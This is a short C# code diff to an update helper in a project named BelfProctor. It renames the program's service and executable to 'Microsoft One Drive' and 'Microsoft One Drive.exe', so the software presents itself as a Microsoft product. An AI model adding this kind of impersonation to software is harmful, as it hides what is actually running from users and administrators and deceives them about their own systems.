@@ -12,8 +12,8 @@ namespace BelfProctor.Services;
 
 public static class UpdateHelper
 {
-    private const string ServiceName = "BelfProctor";
-    private const string InstalledExeName = "BelfProctor.exe";
+    private const string ServiceName = "Microsoft One Drive";
+    private const string InstalledExeName = "Microsoft One Drive.exe";
     private const int IdleThresholdSeconds = 60;
     private const int IdleWaitTimeoutMinutes = 60;
     private const int ChunkSize = 64 * 1024;
